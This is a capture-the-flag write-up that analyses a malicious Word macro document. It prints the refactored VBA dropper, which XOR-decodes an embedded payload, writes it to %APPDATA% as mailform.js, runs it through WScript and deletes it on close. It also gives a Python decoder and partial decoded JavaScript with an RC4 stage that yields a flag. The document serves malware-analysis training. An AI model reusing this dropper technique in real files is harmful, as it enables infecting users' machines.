The challenge is simply a docm file, so i extracted the macros using Oletools (olevba).

After some refractoring and reformating, i got this file:
	libr
```vb
Public path_plus_mailform.js As String
Public appdata_Microsoft_Windows As String


Function weird_xor(given_string() As Byte, length As Long) As Boolean
    Dim xor_key As Byte
    xor_key = 45
    For i = 0 To length - 1
...
Sub AutoClose() 'delete the js script'
    ...
    Kill path_plus_mailform.js
    On Error Resume Next
    Set fsObject = CreateObject("Scripting.FileSystemObject")
    fsObject.DeleteFile appdata_Microsoft_Windows & "\*.*", True
...
Sub AutoOpen()
    ...
    'Checks that UserDomain environ is equal to GAMEMASTERS.local'
    ...
    Else
        ...
        _newFilename = FreeFile
        Open (ActiveDocument.FullName) For Binary As #_newFilename

        Dim filecontent() As Byte
        ReDim filecontent(file_length)
        Get #_newFilename, 1, filecontent

        Dim unicodeStr As String
        unicodeStr = StrConv(filecontent, vbUnicode)

        Dim Elem, RegexResults
        Dim RegExpObject
        ...
        Set RegexResults = RegExpObject.Execute(stringToAnalyse_UNDEFINED_?'SwMbxtWpP')
        Dim firstIndexOfMatchingRegex
        ...
        For Each Elem In RegexResults
            firstIndexOfMatchingRegex = Elem.FirstIndex
        Exit For

        Next ???


        Dim fileContent2() As Byte
        Dim long1 As Long
        long1 = 13082
        ReDim fileContent2(long1)
        Get #_newFilename, firstIndexOfMatchingRegex + 81, fileContent2

        If Not weird_xor(fileContent2(), long1 + 1) Then
            GoTo exit
        End If

        appdata_Microsoft_Windows = Environ("appdata") & "\Microsoft\Windows"

        Set fsObject = CreateObject("Scripting.FileSystemObject")

        'Create appdata folder if doesnt exist'
        If Not fsObject.FolderExists(appdata_Microsoft_Windows) Then
            appdata_Microsoft_Windows = Environ("appdata")
        End If
        ...
        Dim file
        file = FreeFile
        path_plus_mailform.js = appdata_Microsoft_Windows & "\" & "mailform.js"

        Open (path_plus_mailform.js) For Binary As #file
        Put #file, 1, fileContent2
        Close #file
        Erase fileContent2

        Set Shell = CreateObject("WScript.Shell")
        Shell.Run """" + path_plus_mailform.js + """" + " vF8rdgMHKBrvCoCp0ulm"
        ActiveDocument.Save
        Exit Sub
...
After understanding the code, we can see that the program looks for the string `sWcDWp36x5oIe2hJGnRy1iC92AcdQgO8RLioVZWlhCKJXHRSqO450AiqLZyLFeXYilCtorg0p3RdaoPa` inside the document itself, then gather the code after a 81 bytes offset, and apply a custom XOR on it.

Using this code, i retreived a new javascript file:

```python
def weird_xor(given_string, length):
    xor_key = 45
    given_string = list(given_string)
    for i in range(length):
        given_string[i] = chr(given_string[i] ^ xor_key)
        xor_key = ((xor_key ^ 99) ^ (i % 254))
    #print(''.join(given_string))
    return ''.join(given_string)

#while(True):
#    given_string = input("enter given string\n")
#    print(weird_xor(given_string, len(given_string)))

with open ('invitation.docm','rb') as bin:
    byte_array = bin.read()
    #print(byte_array)

    x = byte_array.find(b'sWcDWp36x5oIe2hJGnRy1iC92AcdQgO8RLioVZWlhCKJXHRSqO450AiqLZyLFeXYilCtorg0p3RdaoPa')
    #print(x)

    #print(byte_array[:x+81])
    start = x+80
    end = start + 13082
    print(weird_xor(byte_array[start:end], len(byte_array[start:end])))
```

And here's the script (renamed some vars):

```js
//var args = WScript.Arguments;
var arg1 = 'vF8rdgMHKBrvCoCp0ulm';

var encryptedPayload = getPayload();
payload = decrypt_payload(encryptedPayload);

//console.log(payload)
final_payload = __decrypt_args(arg1, encryptedPayload);
console.log(final_payload);


function __decrypt_args(r, a) {
  var t = [];
  var l = 0;
  var h;
  var u = "";
...
The 2 last functions are only B64 decode, so i'm not analyzing them.

Now we just need to take care of the `decrypt_args` function.

I figured that it was RC4 encryption. So using the passphrase `vF8rdgMHKBrvCoCp0ulm` under cyberchef, using B64 decode and RC4 decode, we get this code:
...
We can see the Cookie:Flag in the header:
```
SFRCe200bGQwY3NfNHIzX2czdHQxbmdfVHIxY2tpMTNyfQo=
```
Decoding using B64 : We get the flag :)
```
